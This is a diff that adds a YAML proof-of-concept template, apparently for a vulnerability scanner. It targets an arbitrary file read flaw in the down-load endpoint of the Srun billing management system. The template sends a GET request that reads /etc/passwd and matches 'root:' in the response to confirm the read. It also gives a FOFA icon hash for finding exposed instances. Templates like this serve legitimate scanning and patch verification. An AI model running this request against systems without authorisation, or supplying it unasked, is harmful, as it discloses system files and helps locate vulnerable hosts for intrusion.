@@ -1,0 +1,15 @@
+id: poc-yaml-srun-down-load-anyfile-read
+info:
+  name: 深澜计费管理系统 down-load 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 深澜计费管理系统
+  fofa: icon_hash="-1546320596"
+requests:
+- method: GET
+  path: /user/group/down-load?file=/etc/passwd
+  expression: status_code == 302 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
